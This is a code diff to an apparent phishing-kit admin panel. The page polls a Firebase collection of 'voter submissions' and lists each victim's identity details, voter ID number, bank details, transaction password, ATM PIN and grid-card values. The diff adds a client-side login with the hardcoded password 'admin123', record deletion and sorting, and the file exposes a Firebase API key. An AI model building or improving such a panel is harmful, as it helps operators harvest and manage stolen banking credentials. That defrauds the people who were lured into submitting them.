@@ -7,57 +7,98 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #f4f7f6; padding: 20px; }
+        
+        /* Login Overlay Styles */
+        #loginOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 9999;
+        }
+        .login-box {
+            background: #fff; padding: 30px; border-radius: 10px; width: 100%; max-width: 350px; text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .login-box h3 { margin-bottom: 15px; color: #0056b3; }
+        .login-box input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
+        .login-box button { width: 100%; padding: 10px; background: #0056b3; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .login-box button:hover { background: #004085; }
+        .error-text { color: red; font-size: 12px; margin-bottom: 10px; display: none; }
+
+        /* Main Admin Content */
+        #adminContent { display: none; }
+
         h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
         .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        table { width: 100%; border-collapse: collapse; min-width: 2000px; }
+        table { width: 100%; border-collapse: collapse; min-width: 2100px; }
         th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
-        th { background-color: #0056b3; color: white; }
+        th { background-color: #0056b3; color: white; position: sticky; top: 0; }
         tr:nth-child(even) { background-color: #f9f9f9; }
         .loading { text-align: center; color: #666; font-style: italic; }
         .refresh-status { text-align: right; font-size: 11px; color: #666; margin-bottom: 8px; font-style: italic; }
+        .logout-btn { float: right; background: #dc3545; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; margin-bottom: 10px; }
+        .delete-btn { background: #dc3545; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .delete-btn:hover { background: #b02a37; }
     </style>
 </head>
 <body>
 
-    <h2>Admin Panel - Live Complete Voter Submissions</h2>
-    <div class="refresh-status">🔄 Auto-refreshing every 3 seconds...</div>
-    
-    <div class="table-container">
-        <table>
-            <thead>
-                <tr>
-                    <th>Time</th>
-                    <th>Full Name</th>
-                    <th>Mobile</th>
-                    <th>EPIC Number</th>
-                    <th>Father's Name</th>
-                    <th>DOB</th>
-                    <th>Gender</th>
-                    <th>Marital Status</th>
-                    <th>Children</th>
-                    <th>Mother's Name</th>
-                    <th>Documents</th>
-                    <th>Payment Method</th>
-                    <th>Payment / Bank Details</th>
-                    <th>Transaction Password</th>
-                    <th>ATM PIN</th>
-                    <th>Grid Step 1</th>
-                    <th>Grid Step 2</th>
-                    <th>Grid Step 3</th>
-                    <th>Grid Step 4</th>
-                    <th>Status / Current Step</th>
-                </tr>
-            </thead>
-            <tbody id="dataTable">
-                <tr><td colspan="20" class="loading">Loading data from Firebase...</td></tr>
-            </tbody>
-        </table>
+    <!-- Login Box Overlay -->
+    <div id="loginOverlay">
+        <div class="login-box">
+            <h3>Admin Login</h3>
+            <div id="errorMsg" class="error-text">गलत पासवर्ड! कृपया दोबारा डालें।</div>
+            <input type="text" id="adminUser" placeholder="Admin Username" value="admin" readonly style="background: #e9ecef;">
+            <input type="password" id="adminPass" placeholder="Enter Password">
+            <button onclick="checkLogin()">Login</button>
+        </div>
+    </div>
+
+    <!-- Main Admin Panel Content -->
+    <div id="adminContent">
+        <h2>
+            Admin Panel - Live Complete Voter Submissions 
+            <button class="logout-btn" onclick="logout()">Logout</button>
+        </h2>
+        <div class="refresh-status">🔄 Auto-refreshing every 3 seconds...</div>
+        
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Time</th>
+                        <th>Full Name</th>
+                        <th>Mobile</th>
+                        <th>EPIC Number</th>
+                        <th>Father's Name</th>
+                        <th>DOB</th>
+                        <th>Gender</th>
+                        <th>Marital Status</th>
+                        <th>Children</th>
+                        <th>Mother's Name</th>
+                        <th>Documents</th>
+                        <th>Payment Method</th>
+                        <th>Payment / Bank Details</th>
+                        <th>Transaction Password</th>
+                        <th>ATM PIN</th>
+                        <th>Grid Step 1</th>
+                        <th>Grid Step 2</th>
+                        <th>Grid Step 3</th>
+                        <th>Grid Step 4</th>
+                        <th>Status / Current Step</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTable">
+                    <tr><td colspan="22" class="loading">Loading data from Firebase...</td></tr>
+                </tbody>
+            </table>
+        </div>
     </div>
 
     <!-- Firebase SDK & Auto-Refresh Script -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
@@ -77,16 +118,30 @@
 
             try {
                 const querySnapshot = await getDocs(collection(db, "voterSubmissions"));
-                tableBody.innerHTML = "";
+                let submissions = [];
                 
-                if (querySnapshot.empty) {
-                    tableBody.innerHTML = "<tr><td colspan='20' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
+                querySnapshot.forEach((document) => {
+                    submissions.push({ id: document.id, ...document.data() });
+                });
+
+                if (submissions.length === 0) {
+                    tableBody.innerHTML = "<tr><td colspan='22' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
                     return;
                 }
 
-                querySnapshot.forEach((doc) => {
-                    const data = doc.data();
+                // समय के अनुसार सॉर्ट करें (नया डेटा सबसे ऊपर)
+                submissions.sort((a, b) => {
+                    let timeA = new Date(a.time || 0);
+                    let timeB = new Date(b.time || 0);
+                    return timeB - timeA;
+                });
+
+                tableBody.innerHTML = "";
+                let serialNumber = 1;
+
+                submissions.forEach((data) => {
                     let row = `<tr>
+                        <td><b>${serialNumber++}</b></td>
                         <td>${data.time || 'N/A'}</td>
                         <td>${data.fullname || 'N/A'}</td>
                         <td>${data.mobile || 'N/A'}</td>
@@ -107,6 +162,7 @@
                         <td>${data.gridStep3 || 'Pending'}</td>
                         <td>${data.gridStep4 || 'Pending'}</td>
                         <td><b>${data.currentStep || 'Started'}</b></td>
+                        <td><button class="delete-btn" onclick="deleteRecord('${data.id}')">Delete</button></td>
                     </tr>`;
                     tableBody.innerHTML += row;
                 });
@@ -115,8 +171,48 @@
             }
         }
 
-        loadSubmissions();
-        setInterval(loadSubmissions, 3000);
+        // रिकॉर्ड डिलीट करने का फंक्शन
+        window.deleteRecord = async function(docId) {
+            if (confirm("क्या आप वाकई इस यूज़र के डेटा को डिलीट करना चाहते हैं?")) {
+                try {
+                    await deleteDoc(doc(db, "voterSubmissions", docId));
+                    loadSubmissions(); // तुरंत टेबल रिफ्रेश करें
+                } catch (error) {
+                    console.error("Error deleting document: ", error);
+                    alert("डेटा डिलीट करने में विफल।");
+                }
+            }
+        }
+
+        // चेक करो कि क्या पहले से लॉगिन है
+        window.onload = function() {
+            if (sessionStorage.getItem('isAdminLoggedIn') === 'true') {
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                loadSubmissions();
+                setInterval(loadSubmissions, 3000);
+            }
+        };
+
+        // लॉगिन फंक्शन (पासवर्ड: admin123)
+        window.checkLogin = function() {
+            const pass = document.getElementById('adminPass').value;
+            if (pass === 'admin123') {
+                sessionStorage.setItem('isAdminLoggedIn', 'true');
+                document.getElementById('loginOverlay').style.display = 'none';
+                document.getElementById('adminContent').style.display = 'block';
+                loadSubmissions();
+                setInterval(loadSubmissions, 3000);
+            } else {
+                document.getElementById('errorMsg').style.display = 'block';
+            }
+        }
+
+        // लॉगआउट फंक्शन
+        window.logout = function() {
+            sessionStorage.removeItem('isAdminLoggedIn');
+            location.reload();
+        }
     </script>
 </body>
 </html>
